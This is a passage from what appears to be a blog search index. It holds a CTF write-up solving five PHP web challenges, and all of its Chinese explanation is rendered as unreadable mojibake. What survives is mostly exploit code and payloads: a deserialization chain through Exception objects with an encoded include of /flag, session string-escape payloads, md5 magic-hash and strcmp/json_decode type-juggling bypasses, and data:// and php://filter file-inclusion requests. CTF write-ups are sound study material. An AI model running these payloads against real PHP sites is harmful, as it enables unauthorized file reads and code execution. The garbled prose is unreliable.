SSRFå®æˆ˜3ï¼šssrfæ¼æ´åˆ©ç”¨(å†…ç½‘æ¢æµ‹ã€æ‰“redis) - ctrl_TTè±† - åšå®¢å›­ (cnblogs.com) wpå‚è€ƒ1 wpå‚è€ƒ2","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"å†…éƒ¨ç«èµ›3","path":"/2023/08/19/nei-bu-jing-sai-ti-3/","content":"web1 &lt;?php highlight_file(__FILE__); error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\", $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(\"Try Hard !!\"); } } } } //åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag if(intval(strrev($_GET['c']))==0x36d){ if (isset($_GET['great'])){ unserialize($_GET['great']); } else { die('error'); } }else { echo 'hacker!!!'; } ?&gt; hacker!!! ååºåˆ—åŒ–å‰æœ‰ä¸ªç®€å•çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬è¾“å…¥778åè½¬åæ˜¯877ä¹Ÿå°±æ˜¯0x36dçš„åè¿›åˆ¶ï¼Œç”±äºå¼±æ¯”è¾ƒçš„ç±»å‹è½¬åŒ–ï¼Œå°±èƒ½ç»•è¿‡ã€‚ æ¥ç€çœ‹é­”æœ¯æ–¹æ³•ï¼Œè¿™é‡Œè¦æ±‚å…¶å˜é‡ä¸èƒ½ç›¸ç­‰ï¼Œä½†ç»è¿‡md5åŠ å¯†ä¸sha1åŠ å¯†ä¹‹åè¦åˆ†åˆ«ç›¸ç­‰ï¼Œç›¸ä¿¡å¤§å¤šæ•°äººè§‰å¾—æ•°ç»„ç»•è¿‡å°±è¡Œäº†ï¼Œä½†å½“ä½ èµ°åˆ°evalå‘ç°æ²¡åŠæ³•äº†ï¼Œè¿™æ—¶å€™å°±æ¶¨çŸ¥è¯†äº†ï¼Œç”¨åˆ°äº†phpçš„åŸç”Ÿç±»ï¼šExceptionç±» åœ¨æ­¤ç±»ä¸­ï¼š - `Exception::__construct` â€” å¼‚å¸¸æ„é€ å‡½æ•° - `Exception::getMessage` â€” è·å–å¼‚å¸¸æ¶ˆæ¯å†…å®¹ - `Exception::getPrevious` â€” è¿”å›å¼‚å¸¸é“¾ä¸­çš„å‰ä¸€ä¸ªå¼‚å¸¸ - `Exception::getCode` â€” è·å–å¼‚å¸¸ä»£ç  - `Exception::getFile` â€” åˆ›å»ºå¼‚å¸¸æ—¶çš„ç¨‹åºæ–‡ä»¶åç§° - `Exception::getLine` â€” è·å–åˆ›å»ºçš„å¼‚å¸¸æ‰€åœ¨æ–‡ä»¶ä¸­çš„è¡Œå· - `Exception::getTrace` â€” è·å–å¼‚å¸¸è¿½è¸ªä¿¡æ¯ - `Exception::getTraceAsString` â€” è·å–å­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸è¿½è¸ªä¿¡æ¯ - `Exception::__toString` â€” å°†å¼‚å¸¸å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸² - `Exception::__clone` â€” å¼‚å¸¸å…‹éš† å¯ä»¥çœ‹åˆ°è‡ªå¸¦tostringæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºå°†å¼‚å¸¸æˆ–é”™è¯¯å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ &lt;?php $a = new Exception(\"payload\",1);$b = new Exception(\"payload\",2); echo $a; echo \"&lt;br&gt;\"; echo $b; ?&gt; //è¾“å‡º exception 'Exception' with message 'payload' in D:\\labwork\\phpstudy_pro\\WWW\\test\\test.php:2 Stack trace: #0 {main} exception 'Exception' with message 'payload' in D:\\labwork\\phpstudy_pro\\WWW\\test\\test.php:2 Stack trace: #0 {main} å½“ç„¶Eorrorç±»ä¸å…¶ä¸€æ ·ï¼Œä¸è¿‡å‰è€…åªç”¨äºphp7ï¼Œåè€…5å’Œ7å‡å¯ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é“é¢˜ç‰ˆæœ¬ä¸º7ï¼Œå› æ­¤åªèƒ½ç”¨è¯¥ç±» æ­¤æ—¶åœ¨æ³¨æ„preg_matchå‡½æ•°å¤šäº†ä¸€ä¸ªmathå‚æ•°ï¼Œè¿™é‡Œå°†ä¼šæŠŠåŒ¹é…åˆ°çš„å†…å®¹åˆ†ä¸ºæ•°ç»„ç©¿è¿›å»ï¼Œä¸è¿‡è¿™é‡Œåˆ©ç”¨çš„ç‚¹ä¸æ˜¯ä»– â€‹ ç”±äºé¢˜ç›®ç”¨preg_matchè¿‡æ»¤äº†å°æ‹¬å·æ— æ³•è°ƒç”¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç›´æ¥ include â€œ/flagâ€ å°†flagåŒ…å«è¿›æ¥å³å¯ï¼›ç”±äºè¿‡æ»¤äº†å¼•å·ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨urlå–åç»•è¿‡ URLç¼–ç å–åç»•è¿‡ é€‚ç”¨PHPç‰ˆæœ¬ï¼šæ— é™åˆ¶ å½“PHP&gt;=7æ—¶ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨å–åæ„é€ payload PS C:\\Users\\Administrator&gt; php -r \"var_dump(urlencode(~'phpinfo'));\" Command line code:1: string(21) \"%8F%97%8F%96%91%99%90\" //å®é™…ä¸Š (~%8F%97%8F%96%91%99%90)(); #phpinfo(); åˆ™pocå¦‚ä¸‹ //åˆ©ç”¨é“¾å¦‚ä¸‹ &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup(){ } } $str = \"?&gt;&lt;?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?&gt;\"; //~urldecode=/flag $a=new Exception($str,1);$b=new Exception($str,2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; //è¿™é‡Œè§£é‡Šä»¥ä¸‹ï¼Œä¸ºä»€ä¹ˆè¦é—­åˆæ‰\"?&gt;\"ï¼Œå› ä¸ºå‰é¢å¯èƒ½ä¼šæœ‰ä¸€äº›æŠ¥é”™çš„ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥å…ˆé—­åˆæ‰å‰é¢çš„ä¸œè¥¿ï¼Œç„¶åå†æ¥åŒ…å«åé¢çš„æ˜¯å–åï¼Œå› ä¸ºåœ¨é“¾é‡Œé¢æ‰€ä»¥éœ€è¦ç”¨åˆ°è§£ç ï¼Œä¸ç”¨ç¼–ç ç»•ä¸è¿‡å»æ­£åˆ™ï¼Œé‡Œé¢æ˜¯/flagå› ä¸ºåˆ·é¢˜å¤šäº†éƒ½åœ¨æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸åœ¨çš„è¯æ­£èƒ½ä¸€æ­¥æ­¥å°è¯•ã€‚ æ‹¿åˆ°flag web2 ç‚¹è¿›å»çœ‹åˆ°æºç ï¼Œæˆ‘ä¸€çœ‹å®¡è®¡æœ‰éš¾åº¦ã€‚ã€‚ã€‚ &lt;?php require('flag.php'); $function = @$_GET['f']; //getä¼ å‚ function filter($img){ //å¯¹å˜é‡è¿›è¡Œæ£€éªŒ,è¿‡æ»¤ç‰¹å®šå…³é”®è¯ $filter_arr = array('jpg','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } if($_SESSION){ //è‹¥sessionä¸å­˜åœ¨,åˆ™é”€æ¯session unset($_SESSION); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; extract($_POST); //å˜é‡è¦†ç›–,æ¼æ´åˆ©ç”¨ç‚¹ if(!$function){ echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;'; } if(!$_GET['img_path']){//è¿™é‡Œåˆsha1åŠ å¯†,å¤§æ¦‚ç‡ä¸ç”¨äº†è€ƒè™‘äº†,è¿™é‡Œåˆ©ç”¨ä¸äº† $_SESSION['img'] = base64_encode('guest_img.png'); }else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path'])); } $serialize_info = filter(serialize($_SESSION));//å¯¹åºåˆ—åŒ–çš„sessionå˜é‡è¿‡æ»¤åœ¨èµ‹å€¼ if($function == 'highlight_file'){ highlight_file('index.php'); }else if($function == 'phpinfo'){ //è¿™é‡Œæ²¡å•¥ç”¨ eval('phpinfo();'); //maybe you can find something in here! }else if($function == 'show_image'){//ååºåˆ—åŒ–åˆ‡å…¥ç‚¹ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode(base64_decode($userinfo['img']))); } é¦–å…ˆå°±æ˜¯ç»™fä¼ å‚show_imageä»¥ä¾¿è¿›è¡Œååºåˆ—åŒ–,æ¥ç€æˆ‘ä»¬ä¸€æ­¥æ­¥æµ‹è¯•ä¸€ä¸‹ æ–¹æ³•ä¸€ï¼šååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ &lt;?php highlight_file(__FILE__); function filter($img){ //å¯¹å˜é‡è¿›è¡Œæ£€éªŒ,è¿‡æ»¤ç‰¹å®šå…³é”®è¯ $filter_arr = array('jpg','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = 'a'; $_SESSION['img'] = 'Wm14aFp5NXdhSEE9';//flag.php base64ç¼–ç ä¸¤æ¬¡ //extract($_POST); //å˜é‡è¦†ç›–,æ¼æ´åˆ©ç”¨ç‚¹ echo '&lt;br&gt;'; var_dump(serialize($_SESSION)); ?&gt; ç»“åˆfilterå‡½æ•°çš„è¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥æƒ³åˆ°ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œåˆå› ä¸ºä»£ç ä¸­è¯´ï¼Œå¦‚æœgetå‚æ•°img_pathä¸å­˜åœ¨ï¼Œåˆ™ä¼šç›´æ¥ç»™imgå˜é‡èµ‹å€¼ï¼Œé‚£æˆ‘ä»¬æƒ³ç»•è¿‡åªèƒ½é é€ƒé€¸ã€‚å¯ä»¥å…ˆæ„é€ å¦‚ä¸‹ï¼š &lt;?php highlight_file(__FILE__); function filter($img){ //å¯¹å˜é‡è¿›è¡Œæ£€éªŒ,è¿‡æ»¤ç‰¹å®šå…³é”®è¯ $filter_arr = array('jpg','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = 'a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}'; $_SESSION['img'] = 'Wm14aFp5NXdhSEE9';//flag.php base64ç¼–ç ä¸¤æ¬¡ //extract($_POST); //å˜é‡è¦†ç›–,æ¼æ´åˆ©ç”¨ç‚¹ echo '&lt;br&gt;'; var_dump(serialize($_SESSION)); ?&gt; string(124) \"a:3:{s:4:\"user\";s:5:\"guest\";s:8:\"function\";s:38:\"a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\" //åœ¨è¿™é‡Œæˆ‘ä»¬å°±è¦åˆ©ç”¨functionå˜é‡æ¥æ„å»ºimgå˜é‡ï¼Œäºæ˜¯æˆ‘ä»¬è¦åœ¨userä¸­æ·»åŠ flagæˆ–è€…å…¶ä»–å…³é”®è¯ï¼Œä»¥ä¾¿å…¶åè¢«è¿‡æ»¤ä¸ºç©ºçš„æ—¶å€™ï¼Œå¯ä»¥åè¿›ä¸€éƒ¨åˆ†functionçš„å†…å®¹ã€‚ //å†æƒ³ä¸€ä¸‹ï¼Œè¦ååˆ°å“ªé‡Œï¼Œé‚£å¾ˆæ˜æ˜¾æ˜¯\"#\";s:8:\"function\";s:38:\"a#\"ï¼Œå³#ä¹‹é—´çš„å†…å®¹ï¼Œè¿™æ ·åé¢çš„imgæ‰ä¼šè¢«å½“åšæ–°çš„sessionå˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸€æ®µå­—ç¬¦ä¸²çš„æ•°é‡ï¼š24ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç»™userèµ‹å€¼ä¸º6ä¸ªflagå³å¯ï¼Œ pocï¼š $_SESSION[\"user\"] = 'flagflagflagflagflagflag'; $_SESSION['function'] = 'a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}'; $_SESSION['img'] = 'Wm14aFp5NXdhSEE9';//flag.php base64ç¼–ç ä¸¤æ¬¡ string(144) \"a:3:{s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:38:\"a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\" //è¿‡æ»¤å string(120) \"a:3:{s:4:\"user\";s:24:\"\";s:8:\"function\";s:38:\"a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\" //å¯ä»¥å‘ç°s:24:\"åé¢è¦åè¿›å»24ä¸ªå­—ç¬¦ï¼Œç›´åˆ°\"aè¿™é‡Œï¼Œç„¶ååé¢çš„åŒå¼•å·é—­åˆå­—ç¬¦ä¸²ï¼Œåˆ†å·é—­åˆè¯¥å˜é‡ï¼Œäºæ˜¯ s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\"; //å°±ä¼šå•ç‹¬å½“åšimgå˜é‡ï¼Œpocå¦‚ä¸‹ï¼š _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";s:2:\"dd\";s:1:\"a\";} //è¿™é‡Œç”±äºå‰é¢æ˜¯3ä¸ªå±æ€§,æ‰€ä»¥è¦åŠ ä¸€ä¸ª. ç»§ç»­ç¼–ç è®¿é—®å³å¯ _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a\";s:3:\"img\";s:16:\"Wm14aFlXRmhZV0Zu\";s:2:\"dd\";s:1:\"a\";} æ‹¿åˆ°flagï¼Œè¿™é‡Œè¯´æ˜ä¸€ä¸‹ä¸ºä½•ä¼ å‚ä¸º_SESSIONè€Œä¸æ˜¯$_SSEIONï¼Œè¿™æ˜¯å› ä¸ºä»£ç ä¸­çš„extractå‡½æ•°ï¼Œä¼šå°†ä¼ å…¥çš„postå†…å®¹è¿›è¡Œå˜é‡è¦†ç›–ï¼Œè€Œ_SESSIONè¿™é‡Œè¦å½“åšå˜é‡åï¼Œæ•…æ­¤åœ¨åç»­ä¸­ä¼šè¢«å½“åšé”®å€¼ç„¶ååœ¨ä½œä¸ºå˜é‡åï¼Œä¹Ÿå°±æ˜¯è‡ªåŠ¨æ·»åŠ $ã€‚ æ–¹æ³•äºŒï¼šå˜é‡è¦†ç›– è¿™ä¸ªå…¶å®è·Ÿæ–¹æ³•ä¸€å·®ä¸å¤šï¼Œåªä¸è¿‡æˆ‘è®¤ä¸ºæœ‰ç‚¹çƒ§è„‘ï¼Œä½†ä¹Ÿæ›´åŠ ç®€ä¾¿ æˆ‘ä»¬å·²ç»çŸ¥é“æˆ‘ä»¬è¦ä¼ çš„æ˜¯ï¼š _SESSION[img]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} ä½†ç”±äºæœ‰ä¸€ä¸ªè‡ªåŠ¨ç»™imgå˜é‡èµ‹å€¼çš„è¯­å¥ï¼š $_SESSION['img'] = base64_encode('guest_img.png'); å› æ­¤æˆ‘ä»¬éœ€è¦åˆ©ç”¨filterå‡½æ•°ï¼Œå‡å¦‚æˆ‘ä»¬ä¼ å…¥ï¼š _SESSION[imgphp]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} é‚£ä¹ˆphpè¢«è¿‡æ»¤ï¼Œä½†æ­¤å˜é‡ä¾æ—§å­˜åœ¨ä¹Ÿå°±æ˜¯ï¼š_SESSION[img]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} ä¸ä¼šå’Œç¯å¢ƒè‡ªå¸¦çš„imgå˜é‡å†²çªï¼Œè¾“å…¥å¦‚ä¸‹ \"a:1:{s:7:\"img\";s:36:\";s:3:\"img\";s:20:\"Wm14aFp5NXdhSEE9\";}\";}\" //ç”±æ­¤æˆ‘ä»¬åˆæƒ³åˆ°å­—ç¬¦ä¸²é€ƒé€¸ï¼Œæˆ‘ä»¬æƒ³æ³•è¯»åˆ°s:36:å³å¯ï¼Œä¸€å…±10ä¸ªï¼Œé‚£ä¹ˆæ„é€ å¦‚ä¸‹ \"a:1:{s:10:\"img\";s:36:\";s:3:\"img\";s:20:\"Wm14aFp5NXdhSEE9\";}\";}\"//åˆ†å·é—­åˆç»“å°¾ï¼Œè€Œç¯å¢ƒè‡ªå¸¦çš„imgå˜é‡ä¾¿è¯»ä¸è¿›å»è€Œæ²¡ç”¨äº† //pocï¼› $_SESSION[imgflag]=;s:3:\"123\";s:3:\"img\";s:16:\"$_SESSION[imgphpflag]=;s:3:\"123\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";} //ä½†è¦æ³¨æ„æœ‰ä¸‰ä¸ªå…ƒç´ ,å› æ­¤è¿™é‡Œè¿˜è¦åœ¨æ·»åŠ ä¸€ä¸ª,ä½†è¦æ·»åŠ åœ¨å‰é¢ //è¾“å‡º \"a:1:{s:7:\"img\";s:50:\";s:3:\"123\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";}\";}\" //ä¸ºäº†è¯»å–åˆ°:æˆ‘ä»¬è¦å†æ·»åŠ ä¸‰ä¸ªå­—ç¬¦,è®©s:7å˜æˆs:10, //æœ€ç»ˆpayload $_SESSION[imgjpgflag]=;s:3:\"123\";s:3:\"img\";s:16:\"Wm14aFp5NXdhSEE9\";} æ–‡ç« å‚è€ƒï¼š å‚è€ƒä¸€ å‚è€ƒäºŒ web3 æ²¡ä¿¡æ¯ï¼Œç‚¹å‡»å¼€å§‹çœ‹çœ‹ çœ‹æºä»£ç  base64è§£ç çœ‹çœ‹ é‚£å°±è®¿é—®ä¸€ä¸‹110.phpï¼Œæœ‰ç‚¹å¤æ‚çš„ä»£ç å®¡è®¡ï¼Œä¸æ…Œ &lt;?php include 'fl0g.php'; highlight_file(__FILE__); if(isset($_GET['mo'])&amp;&amp;isset($_GET['fish'])) { $mo=$_GET['mo']; $fish=$_GET['fish']; $logined=false; $keys=true; if (!ctype_alpha($mo)){$keys=false;} if (!is_numeric($fish) ){$keys=false;} if (md5($mo) == md5($fish)) { echo\"Let's start fishing !\"; $b = $_GET['b']; { if('f1a9' === substr(md5($b),-4,4)) { $password=\"doyoulikemoyu?\"; if(isset($_POST['password'])) { if(strcmp($_POST['password'],$password) == 0) { if (isset($_POST['message'])) { $message = json_decode($_POST['message']); $key =\"*********\"; if($message-&gt;key == $key) { $logined=true; } } } else { echo\"That's a little bit !\"; } } else { echo\"you don't like mo yu ???\"; } } else { die(\"You are not far from success !\"); } } } else { echo\"good see you next !\"; } } else { echo\"Think again !\"; } if($logined&amp;&amp;$keys) { echo 'Congratulations on your successful fishing !'; highlight_file('fl0g.php'); die('By Wang'); } ?&gt; Think again ! ç»•è¿‡ä¸€ï¼š è¿™é‡Œè¦æ±‚è¾“å…¥çš„å†…å®¹ä¸ºå­—ç¬¦ä¸² è¿™é‡Œåˆ™æ˜¯æ£€æµ‹æ˜¯å¦ä¸ºæ•°å­—ï¼Œæ¥ç€é…åˆmd5å¼±æ¯”è¾ƒï¼Œä½†è¿™é‡Œä¸èƒ½ç”¨æ•°ç»„ï¼Œå› ä¸ºå‰é¢çš„ifä¼šå½±å“å˜é‡çš„å¸ƒå°”å€¼ã€‚å› æ­¤åªéœ€è¦å…¶md5å€¼æ˜¯ä»¥0eå¼€å¤´å³å¯ åªè¦æ˜¯ä»¥0eå¼€å¤´ï¼Œåé¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²0æ¯”è¾ƒå€¼éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œå› ä¸ºä¸ç®¡0ä¸è®ºå’Œå¤šå°‘ç›¸ä¹˜éƒ½æ˜¯0ã€‚ ä¸€äº›ä¾‹å­ï¼š 1.QNKCDZO 0e830400451993494058024219903391 2.s878926199a 0e545993274517709034328855841020 3.s155964671a 0e342768416822451524974117254469 4.s214587387a 0e848240448830537924465865611904 5.s214587387a 0e848240448830537924465865611904 6.s878926199a 0e545993274517709034328855841020 7.s1091221200a 0e940624217856561557816327384675 8.s1885207154a 0e509367213418206700842008763514 9.240610708 0e462097431906509019562988736854 äºæ˜¯è¿™é‡Œä¼ å‚ä¸ºï¼š?mo=QNKCDZO&amp;fish=240610708 ç»•è¿‡äºŒ: ç¬¬ä¸€å¤„è¦æ±‚ä¼ å…¥çš„å‚æ•°ç»è¿‡md5åŠ å¯†åçš„åå››ä½ä¸æŒ‡å®šçš„å­—ç¬¦ä¸²ç›¸åŒï¼Œæ— æ³•ï¼Œåªå¾—ä¸Šè„šæœ¬ã€‚ import hashlib for i in range(100000): m = hashlib.md5() m.update(str(i).encode()) h = m.hexdigest() if h[-4:] == \"f1a9\": print(i) break æˆåŠŸï¼ ç»•è¿‡ä¸‰ï¼š $password=\"doyoulikemoyu?\"; if(isset($_POST['password'])) { if(strcmp($_POST['password'],$password) == 0) è¿™é‡Œæˆ‘ä¸ç†è§£è¿™ä¸ªpasswordçš„è®¾å®šï¼Œæ„Ÿè§‰æœ‰é—®é¢˜ï¼Œä¸è¿‡è€ƒå¯Ÿç‚¹å¯ä»¥çŸ¥é“å°±æ˜¯ç»•è¿‡strcmpï¼Œè€ƒè™‘å…¶ç‰¹æ€§ strcmpæ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœä¸¤è€…ç›¸ç­‰ è¿”å›0 é¢˜ç›®è¦æ±‚strcmpåˆ¤æ–­çš„æ¥å—çš„å€¼å’Œ$passwordå¿…éœ€ç›¸ç­‰ï¼Œstrcmpä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œ é‚£æˆ‘ä»¬ä¼ å…¥ password[]=xxx å¯ä»¥ç»•è¿‡ è¿™æ˜¯å› ä¸ºå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œå°†å‘ç”Ÿé”™è¯¯ï¼Œè¿”å›nullï¼Œå› æ­¤ä¸0æ¯”è¾ƒä¼šåˆ¤æ–­ç›¸ç­‰ $message = json_decode($_POST['message']); $key =\"*********\"; if($message-&gt;key == $key) { $logined=true; } ç»•è¿‡å››ï¼š è¿™é‡Œçš„keyå˜é‡å°±æ­£å¸¸äº†ï¼Œæ˜¾ç„¶è€ƒå¯Ÿçš„æœ‰æ—¶jsonè§£ç  è¾“å…¥ä¸€ä¸ªjsonç±»å‹çš„å­—ç¬¦ä¸²ï¼Œjson_decodeå‡½æ•°è§£å¯†æˆä¸€ä¸ªæ•°ç»„ï¼Œåˆ¤æ–­æ•°ç»„ä¸­keyçš„å€¼æ˜¯å¦ç­‰äº $keyçš„å€¼ï¼Œä½†æ˜¯$keyçš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨0==\"admin\"è¿™ç§å½¢å¼ç»•è¿‡ å› ä¸ºè¯´åˆ°åº•è¿™å°±æ˜¯ä¸ªå¼±æ¯”è¾ƒç±»å‹ï¼Œ0ä¸å­—ç¬¦ä¸²æ¯”è¾ƒéƒ½æ˜¯è¿”å›true æ•…payloadå¦‚ä¸‹ getï¼š?mo=QNKCDZO&amp;fish=240610708&amp;b=12400 postï¼špassword[]=1&amp;message={\"key\":0} æ‹¿åˆ°flag web4 å¼€å§‹å®¡è®¡ &lt;?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"flag is here\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //here.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?&gt; è¿™é‡Œä¼ å…¥textå‚æ•°ï¼Œå¹¶ä¸”å…¶ä¸­çš„å†…å®¹è¦å®Œå…¨ç­‰äº\"flag is here\"ï¼Œè¿™æ—¶å€™å°±æƒ³åˆ°inputæˆ–è€…dataä¼ªåè®® ä½¿ç”¨php://inputä¼ªåè®®ç»•è¿‡ å°†è¦GETçš„å‚æ•°?xxx=php://input ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼ åŸå› ï¼šphp://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œï¼Œå½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ï¼Œä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ ç”¨data://ä¼ªåè®®ç»•è¿‡ å°†urlæ”¹ä¸ºï¼š?xxx=data://text/plain;base64,æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç  æˆ–è€…å°†urlæ”¹ä¸ºï¼š?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹) æˆ‘ä»¬æœ‰çœ‹åˆ°here.phpæ–‡ä»¶åŒ…å«ï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆä½¿ç”¨filteråè®®è¯»å–é‡Œé¢çš„æºç ã€‚ payloadå¦‚ä¸‹ï¼š?text=data://text/plain;base64,ZmxhZyBpcyBoZXJl&amp;file=&amp;file=php://filter/convert.base64-encode/resource=here.php &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"OMO SO CLOSE !///COME ON\"); } } } ?&gt; //pocå¦‚ä¸‹ï¼š &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ } $poc=new Flag(); $poc-&gt;file=\"flag.php\"; echo serialize($poc); ?&gt; //è¿™é‡Œåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è¢«èµ‹å€¼ä¸ºpasswordï¼Œç„¶åå†é¡µé¢æœ‰echo $passwordçš„è¯­å¥ï¼Œæ•…æ­¤è°ƒç”¨tostringæ–¹æ³•ï¼ŒæˆåŠŸè¯»åˆ°flag payloadå¦‚ä¸‹ï¼š?text=data://text/plain;base64,ZmxhZyBpcyBoZXJl&amp;file=&amp;file=here.php&amp;password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} web5 &lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {//åˆ¤æ–­æ˜¯å¦å­˜åœ¨xffå¤´ $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; }//è‹¥å­˜åœ¨ï¼Œåˆ™å°†å®¢æˆ·ç«¯ IP åœ°å€è®¾ç½®ä¸º HTTP_X_FORWARDED_FOR çš„å€¼ if(!isset($_GET['host'])) { highlight_file(__FILE__); } else { $host = $_GET['host']; $host = escapeshellarg($host);//æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•° $host = escapeshellcmd($host);// shell å…ƒå­—ç¬¦è½¬ä¹‰ $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); //ä»£ç ç”Ÿæˆä¸€ä¸ªåä¸º $sandbox çš„ç›®å½•åï¼Œè¯¥ç›®å½•åæ˜¯åŸºäº \"glzjin\" å’Œå®¢æˆ·ç«¯ IP åœ°å€çš„ MD5 æ•£åˆ—å€¼ã€‚ echo 'you are in sandbox '.$sandbox; @mkdir($sandbox);//åœ¨å½“å‰å·¥ä½œç›®å½•ä¸‹åˆ›å»ºäº†è¿™ä¸ªç›®å½•ï¼Œå¹¶å°†å·¥ä½œç›®å½•åˆ‡æ¢åˆ°è¯¥ç›®å½•ä¸­ã€‚ chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host); //æ‰§è¡Œäº†ä¸€ä¸ª nmap å‘½ä»¤æ¥æ‰«æç”¨æˆ·æä¾›çš„ä¸»æœºï¼Œæ‰«æç»“æœä¼šè¢«è¾“å‡ºæ˜¾ç¤ºã€‚ } å®¡äº†åŠå¤©ä¸æ¸…æ¥šåˆ©ç”¨ç‚¹ã€‚ã€‚ã€‚ã€‚å€ŸåŠ©wpå§ï¼Œå¤ªèœäº† escapeshellarg()å‡½æ•°ï¼šescapeshellarg() 